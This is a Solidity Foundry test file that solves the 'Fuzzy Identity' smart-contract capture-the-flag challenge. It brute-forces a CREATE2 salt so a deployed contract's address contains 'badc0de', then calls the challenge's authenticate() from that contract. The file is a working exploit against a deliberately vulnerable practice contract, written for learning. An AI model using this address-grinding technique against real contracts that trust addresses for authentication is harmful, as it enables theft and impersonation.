// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {FuzzyIdentityChallenge} from "./FuzzyIdentityChallenge.sol";
import {Create2, Create2Deployer} from "src/utils/Create2.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    address deployerAddr = 0xce110ab5927CC46905460D930CCa0c6fB4666219;
    FuzzyIdentityChallenge challenge;

    function setUp() public {
        challenge = new FuzzyIdentityChallenge();
        vm.deal(playerAddr, 1 ether);
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        Create2Deployer deployer = new Create2Deployer();
        assert(address(deployer) == deployerAddr);
        bytes32 salt = bytes32(uint256(3289423)); // found by _testSearchSalt
        address exploitAddr = deployer.deploy(vm.getCode("Exploit.t.sol:FuzzyIdentityExploit"), salt);
        FuzzyIdentityExploit(exploitAddr).exploit(address(challenge));

        vm.stopPrank();
        assertTrue(challenge.isComplete(), "Challenge is not complete");
    }

    // this function is used to find the salt, but it uses a lot of gas, so it should be called only once.
    // usually, the function name changes to `_testSearchSalt` after the salt is found.
    // use the following command: forge test -vv
    function _testSearchSalt() public view {
        bytes memory creationCode = vm.getCode("Exploit.t.sol:FuzzyIdentityExploit");
        for (uint256 salt = 0; salt < (1 << 32); salt++) {
            bytes20 addr = bytes20(Create2.computeAddr(deployerAddr, bytes32(salt), creationCode));
            bytes20 id = hex"000000000000000000000000000000000badc0de";
            bytes20 mask = hex"000000000000000000000000000000000fffffff";
            bool bad = false;
            for (uint256 i = 0; i < 34; i++) {
                if (addr & mask == id) {
                    bad = true;
                    break;
                }
                mask <<= 4;
                id <<= 4;
            }
            if (bad) {
                console.log("salt %d", salt);
                break;
            }
        }
    }
}

contract FuzzyIdentityExploit {
    function exploit(address challengeAddr) public {
        FuzzyIdentityChallenge(challengeAddr).authenticate();
    }

    function name() public pure returns (bytes32) {
        return bytes32("smarx");
    }
}
